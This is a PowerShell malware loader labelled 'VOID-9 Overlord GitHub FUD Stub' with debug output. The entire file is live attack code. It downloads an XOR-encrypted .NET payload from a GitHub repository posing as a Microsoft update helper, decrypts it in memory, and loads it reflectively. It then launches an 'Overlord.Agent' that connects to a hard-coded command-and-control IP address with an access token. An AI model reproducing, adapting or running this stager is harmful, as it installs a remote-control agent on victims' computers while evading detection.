# VOID-9 Overlord GitHub FUD Stub 2026 - AGGRESSIVE DEBUG + BETTER DOWNLOAD
Write-Host "=== VOID-9 AGGRESSIVE DEBUG START ===" -ForegroundColor Green

try {
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    Write-Host "Attempting download from: $url" -ForegroundColor Yellow

    $wc = New-Object Net.WebClient
    $wc.Headers.Clear()
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
    $wc.Headers.Add("Accept", "*/*")
    $wc.Headers.Add("Cache-Control", "no-cache")

    $data = $wc.DownloadData($url)

    Write-Host "Downloaded $($data.Length) bytes" -ForegroundColor Green

    if ($data.Length -lt 500000) {
        Write-Host "WARNING: File suspiciously small - possible bad download" -ForegroundColor Red
    }

    # XOR decrypt
    for($i=0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor 0x69
    }
    Write-Host "XOR decryption completed" -ForegroundColor Green

    # Load assembly
    $asm = [System.Reflection.Assembly]::Load($data)
    Write-Host "Assembly loaded successfully" -ForegroundColor Green

    $type = $asm.GetType("Overlord.Agent")
    $method = $type.GetMethod("Run", [Reflection.BindingFlags]"Public,Static")

    $c2url = "http://176.65.132.236:5173"
    $token = "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ"

    Write-Host "Invoking Overlord Agent -> $c2url ..." -ForegroundColor Cyan
    $method.Invoke($null, @($c2url, $token))

    Write-Host "=== AGENT LAUNCHED - CHECK YOUR OVERLORD DASHBOARD ===" -ForegroundColor Green
}
catch {
    Write-Host "ERROR OCCURRED:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.Exception.InnerException) {
        Write-Host "Inner: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    }
}

Write-Host "=== VOID-9 AGGRESSIVE DEBUG END ===" -ForegroundColor Green
